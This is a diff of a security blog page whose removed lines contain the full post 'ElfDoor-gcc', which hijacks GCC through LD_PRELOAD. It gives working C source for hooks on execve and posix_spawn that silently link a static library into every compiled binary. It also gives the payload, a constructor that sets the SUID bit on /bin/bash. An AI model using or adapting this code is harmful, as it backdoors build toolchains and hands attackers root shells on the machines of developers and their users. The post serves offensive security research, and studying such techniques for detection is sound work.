@@ -1,110 +1,283 @@
-<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>ElfDoor-gcc · 0xMatheuZ</title><meta name=description content="Hijacking GCC via LD_PRELOAD."><meta name=author content="0xMatheuZ"><meta name=keywords content="Rootkit"><link rel=canonical href=https://matheuzsecurity.github.io/hacking/gcc/><meta property="og:title" content="ElfDoor-gcc · 0xMatheuZ"><meta property="og:description" content="Hijacking GCC via LD_PRELOAD."><meta property="og:type" content="article"><meta property="og:url" content="https://matheuzsecurity.github.io/hacking/gcc/"><meta name=twitter:card content="summary"><meta name=twitter:site content="@MatheuzSecurity"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.min.1bc67ffb4441d0e85aecd23bda1eb9c0f69c871ef26d2a8dc539665adbf80152.css integrity="sha256-G8Z/+0RB0Oha7NI72h65wPachx7ybSqNxTlmWtv4AVI="><link rel=icon href=/img/0xm-badge.png><meta name=theme-color content="#06070b"></head><body id=top><header class=site-head><div class=wrap><nav class=nav><span class=prompt><a href=/>matheuz</a>@0xm:~$</span>
-<a href=/>Home</a>
-<a href=/hacking>hacking</a>
-<a href=/tags>Tags</a>
-<a href=/search>Search</a></nav></div></header><main class=main><article class=article><div class=art-head><div class=crumbs><span class=prompt>$ cd</span>
-<a href=/>~</a><span class=sep>/</span><a href=https://matheuzsecurity.github.io/hacking/>Hacking</a></div><h1 class=art-title>ElfDoor-gcc</h1><p class=art-desc>Hijacking GCC via LD_PRELOAD.</p><div class=art-meta><span>April 13, 2025</span><span class=sep>·</span><span>6 min read</span>
-<span class=sep>·</span><span>0xMatheuZ</span><span class=sep>·</span><span>Malware</span></div><div class=art-tags><a href=/tags/rootkit/>Rootkit</a></div></div><hr class=art-sep><div class=content><h1 id=hijacking-gcc-with-ld_preload>Hijacking GCC with LD_PRELOAD</h1><p><img src=https://i.imgur.com/MmPbrjL.png alt=imgur></p><h2 id=introduction>Introduction</h2><p>If you&rsquo;ve ever wondered how it&rsquo;s possible to inject malicious code into binaries <strong>without touching the source code</strong>, and using only standard Linux tools, this article is for you. We&rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during <strong>linking</strong>.</p><p>In the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.</p><p>This is a simple project, with simple ideas and mechanisms, and it can certainly be improved.</p><p>ElfDoor-gcc repo: <a href=https://github.com/MatheuZSecurity/ElfDoor-gcc>https://github.com/MatheuZSecurity/ElfDoor-gcc</a></p><h2 id=understanding-the-compilation-process-with-gcc>Understanding the Compilation Process with GCC</h2><p>Before attacking the compilation process, it&rsquo;s essential to understand how it works</p><p>GCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:</p><p><code>gcc main.c -o main</code></p><p>This command has a sequence of steps:</p><ol><li><p><strong>Preprocessing (cpp)</strong></p><ul><li><p>Expands macros, includes header files, and removes comments.</p></li><li><p>Generates a .i file containing the &ldquo;expanded&rdquo; source code.</p></li></ul></li><li><p><strong>Compilation (cc1)</strong></p><ul><li><p>Converts the .i code into assembly.</p></li><li><p>Performs syntax and semantic checks, along with optimizations.</p></li></ul></li><li><p><strong>Assembly (as)</strong></p><ul><li>Translates the assembly code into an object file (.o).</li></ul></li><li><p><strong>Linkagem (collect2 → ld)</strong></p><ul><li><p>Combines object files, resolves symbols, and produces the final binary.</p></li><li><p>gcc invokes collect2, which in turn calls ld, the actual linker.</p></li></ul></li></ol><p>This final stage <strong>linking</strong>, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library</p><h2 id=attack-chain>Attack Chain</h2><p>The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.</p><p>Our project will consist of:</p><ul><li><p><strong>main.c</strong>: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.</p></li><li><p><strong>b.a</strong>: The library containing the malicious code we want to embed in the final binary</p></li><li><p><strong>Install.sh</strong>: Compiles and loads our malicious LD_PRELOAD.</p></li><li><p><strong>hello.c</strong>: A simple program that just prints &ldquo;Hello,&rdquo; but after compiling and executing, it will run our malicious code.</p></li></ul><h2 id=elfdoor-hooks>ElfDoor Hooks</h2><p>The <code>main.c</code> file is responsible for hooking process execution functions, such as <code>execve</code> and <code>posix_spawn</code>, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a &ldquo;hidden&rdquo; payload without the developer noticing.</p><p>The structure starts with the inclusion of the essential libraries:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
-</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dlfcn.h&gt;</span><span class=cp>
-</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;spawn.h&gt;</span><span class=cp>
-</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
-</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
-</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
-</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
-</span></span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>extern</span> <span class=kt>char</span> <span class=o>**</span><span class=n>environ</span><span class=p>;</span>
-</span></span></code></pre></div><p>The use of <code>_GNU_SOURCE</code> is essential to enable GNU libc specific extensions, such as the interception of <code>execve</code> and <code>posix_spawn</code>. Including <code>&lt;dlfcn.h></code> allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.</p><p>Next, we have auxiliary functions responsible for determining if the running binary is relevant. For example, <code>is_gcc</code> detects whether the binary being executed is the <code>GCC</code>, <code>cc</code>, or <code>clang</code> compiler:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>is_gcc</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>progname</span> <span class=o>=</span> <span class=nf>strrchr</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=sc>&#39;/&#39;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=n>progname</span> <span class=o>=</span> <span class=n>progname</span> <span class=o>?</span> <span class=n>progname</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>:</span> <span class=n>path</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>progname</span><span class=p>,</span> <span class=s>&#34;gcc&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>progname</span><span class=p>,</span> <span class=s>&#34;cc&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>progname</span><span class=p>,</span> <span class=s>&#34;clang&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify <code>collect2</code> and <code>ld</code> in the <code>is_collect2</code> and <code>is_linker</code> functions.</p><p>Then, the <code>should_inject</code> function determines whether the injection should occur, based on the compiler arguments:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>should_inject</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>];</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s>&#34;-c&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s>&#34;-E&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s>&#34;-S&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.</p><p>The most important function is <code>inject_args</code>, which constructs a new argument list by inserting the static library:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>char</span> <span class=o>**</span><span class=nf>inject_args</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>bin_path</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>int</span> <span class=n>extra</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>argc</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>argc</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>argv</span><span class=p>[</span><span class=n>argc</span><span class=p>];</span> <span class=o>++</span><span class=n>argc</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>lib_path</span> <span class=o>=</span> <span class=s>&#34;/dev/shm/b.a&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>argc</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s>&#34;b.a&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>new_argv</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>argc</span> <span class=o>+</span> <span class=n>extra</span> <span class=o>+</span> <span class=mi>1</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>new_argv</span><span class=p>)</span> <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>argc</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>new_argv</span><span class=p>[</span><span class=n>j</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>arg1</span><span class=p>,</span> <span class=o>*</span><span class=n>arg2</span><span class=p>,</span> <span class=o>*</span><span class=n>arg3</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>is_gcc</span><span class=p>(</span><span class=n>bin_path</span><span class=p>))</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=n>arg1</span> <span class=o>=</span> <span class=s>&#34;-Wl,--whole-archive&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=n>arg2</span> <span class=o>=</span> <span class=n>lib_path</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=n>arg3</span> <span class=o>=</span> <span class=s>&#34;-Wl,--no-whole-archive&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=n>arg1</span> <span class=o>=</span> <span class=s>&#34;--whole-archive&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=n>arg2</span> <span class=o>=</span> <span class=n>lib_path</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=n>arg3</span> <span class=o>=</span> <span class=s>&#34;--no-whole-archive&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>new_argv</span><span class=p>[</span><span class=n>j</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>arg1</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=n>new_argv</span><span class=p>[</span><span class=n>j</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>arg2</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=n>new_argv</span><span class=p>[</span><span class=n>j</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>arg3</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=n>new_argv</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>char</span> <span class=o>**</span><span class=p>)</span><span class=n>new_argv</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>The <code>inject_args</code> function modifies a program&rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.</p><p>The hooking of <code>execve</code> happens as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>execve</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>pathname</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>envp</span><span class=p>[])</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>static</span> <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>real_execve</span><span class=p>)(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=p>[],</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=p>[])</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>real_execve</span><span class=p>)</span> <span class=n>real_execve</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;execve&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=nf>is_gcc</span><span class=p>(</span><span class=n>pathname</span><span class=p>)</span> <span class=o>||</span> <span class=nf>is_collect2</span><span class=p>(</span><span class=n>pathname</span><span class=p>)</span> <span class=o>||</span> <span class=nf>is_linker</span><span class=p>(</span><span class=n>pathname</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=nf>should_inject</span><span class=p>(</span><span class=n>argv</span><span class=p>))</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>**</span><span class=n>new_argv</span> <span class=o>=</span> <span class=nf>inject_args</span><span class=p>(</span><span class=n>pathname</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>new_argv</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>result</span> <span class=o>=</span> <span class=nf>real_execve</span><span class=p>(</span><span class=n>pathname</span><span class=p>,</span> <span class=n>new_argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>            <span class=nf>free</span><span class=p>(</span><span class=n>new_argv</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>real_execve</span><span class=p>(</span><span class=n>pathname</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>When the process attempts to execute <code>gcc</code>, <code>ld</code>, or similar, the <code>execve</code> hook intercepts the call. It calls the <code>inject_args</code> function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original <code>execve</code> function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.</p><p>Finally, the <code>posix_spawn</code> function is handled with identical logic:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>posix_spawn</span><span class=p>(</span><span class=kt>pid_t</span> <span class=o>*</span><span class=n>pid</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>                <span class=k>const</span> <span class=kt>posix_spawn_file_actions_t</span> <span class=o>*</span><span class=n>file_actions</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>                <span class=k>const</span> <span class=kt>posix_spawnattr_t</span> <span class=o>*</span><span class=n>attrp</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>                <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>envp</span><span class=p>[])</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>static</span> <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>real_posix_spawn</span><span class=p>)(</span><span class=kt>pid_t</span> <span class=o>*</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>                                   <span class=k>const</span> <span class=kt>posix_spawn_file_actions_t</span> <span class=o>*</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>                                   <span class=k>const</span> <span class=kt>posix_spawnattr_t</span> <span class=o>*</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>                                   <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=p>[],</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=p>[])</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>real_posix_spawn</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>real_posix_spawn</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;posix_spawn&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=nf>is_gcc</span><span class=p>(</span><span class=n>path</span><span class=p>)</span> <span class=o>||</span> <span class=nf>is_collect2</span><span class=p>(</span><span class=n>path</span><span class=p>)</span> <span class=o>||</span> <span class=nf>is_linker</span><span class=p>(</span><span class=n>path</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=nf>should_inject</span><span class=p>(</span><span class=n>argv</span><span class=p>))</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>**</span><span class=n>new_argv</span> <span class=o>=</span> <span class=nf>inject_args</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>new_argv</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>result</span> <span class=o>=</span> <span class=nf>real_posix_spawn</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>file_actions</span><span class=p>,</span> <span class=n>attrp</span><span class=p>,</span> <span class=n>new_argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>            <span class=nf>free</span><span class=p>(</span><span class=n>new_argv</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>real_posix_spawn</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>file_actions</span><span class=p>,</span> <span class=n>attrp</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>This hook ensures that even when <code>gcc</code> or <code>ld</code> use <code>posix_spawn</code> internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.</p><p>The entire mechanism is activated when the library compiled with this <code>main.c</code> is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.</p><h2 id=malicious-code-bc>Malicious code: b.c</h2><p>The purpose of the b.c code is to modify the permissions of <code>/bin/bash</code> to allow it to be executed with elevated privileges.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
-</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
-</span></span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nf>__attribute__</span><span class=p>((</span><span class=n>constructor</span><span class=p>))</span> 
-</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>backdoor</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nf>chmod</span><span class=p>(</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=mo>04755</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the <code>SUID</code> on <code>/bin/bash</code>.</p><h2 id=poc>POC</h2><p><img src=https://i.imgur.com/ZSM4udM.png alt=imgur></p><h2 id=conclusion>Conclusion</h2><p>With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.</p><p>The result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.</p><p>Please feel free to contact me on <a href=https://x.com/MatheuzSecurity>Twitter</a> if you have any questions.</p><p><a href=https://discord.gg/66N5ZQppU7>Rootkit Researchers</a></p></div><footer class=art-foot><nav class=navlinks><a class=prev href=/hacking/ftrace-rootkit/><span class=label>&lt;&lt; prev</span><br>Detecting rootkits based on ftrace hooking.</a><a class=next href=/hacking/bypass-userland-hooks/><span class=label>next >></span><br>Bypassing LD_PRELOAD Rootkits Is Easy</a></nav></footer></article></main><footer class=foot><span>&copy; 2026 <a href=/>0xMatheuZ</a></span>
-<span>built with <a href=https://gohugo.io/ target=_blank rel=noopener>hugo</a> · handcrafted layouts</span></footer><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode,s=n.parentNode,t=document.createElement("button");t.className="copy-code",t.type="button",t.textContent="copy";const i=()=>{t.textContent="copied",setTimeout(()=>t.textContent="copy",1600)};t.addEventListener("click",()=>{navigator.clipboard.writeText(e.textContent).then(i).catch(()=>{})});const o=s.classList.contains("highlight")?s:n;o.style.position="relative",o.appendChild(t)})</script></body></html>
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="index, follow">
+
+<title>ElfDoor-gcc · 0xMatheuZ</title>
+<meta name="description" content="Hijacking GCC via LD_PRELOAD.">
+<meta name="author" content="0xMatheuZ"><meta name="keywords" content="Rootkit">
+<link rel="canonical" href="http://localhost:1313/hacking/gcc/">
+<meta property="og:title" content="ElfDoor-gcc · 0xMatheuZ">
+<meta property="og:description" content="Hijacking GCC via LD_PRELOAD.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://localhost:1313/hacking/gcc/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@MatheuzSecurity">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/main.min.1bc67ffb4441d0e85aecd23bda1eb9c0f69c871ef26d2a8dc539665adbf80152.css" integrity="sha256-G8Z/&#43;0RB0Oha7NI72h65wPachx7ybSqNxTlmWtv4AVI=">
+<link rel="icon" href="/img/0xm-badge.png">
+<meta name="theme-color" content="#06070b">
+</head>
+<body id="top"><header class="site-head">
+  <div class="wrap">
+    <nav class="nav">
+      <span class="prompt"><a href="/">matheuz</a>@0xm:~$</span>
+      <a href="/">Home</a>
+      <a href="/hacking">hacking</a>
+      <a href="/tags">Tags</a>
+      <a href="/search">Search</a>
+    </nav>
+  </div>
+</header>
+<main class="main">
+
+<article class="article">
+  <div class="art-head">
+    <div class="crumbs">
+    <span class="prompt">$ cd</span>
+    <a href="/">~</a><span class="sep">/</span><a href="http://localhost:1313/hacking/">Hacking</a></div>
+
+    <h1 class="art-title">ElfDoor-gcc</h1><p class="art-desc">Hijacking GCC via LD_PRELOAD.</p>
+    <div class="art-meta">
+      <span>April 13, 2025</span><span class="sep">·</span><span>6 min read</span>
+      <span class="sep">·</span><span>0xMatheuZ</span><span class="sep">·</span><span>Malware</span>
+    </div>
+    <div class="art-tags"><a href="/tags/rootkit/">Rootkit</a>
+    </div>
+  </div>
+
+  <hr class="art-sep">
+
+  <div class="content">
+    <h1 id="hijacking-gcc-with-ld_preload">Hijacking GCC with LD_PRELOAD</h1>
+<p><img src="https://i.imgur.com/MmPbrjL.png" alt="imgur"></p>
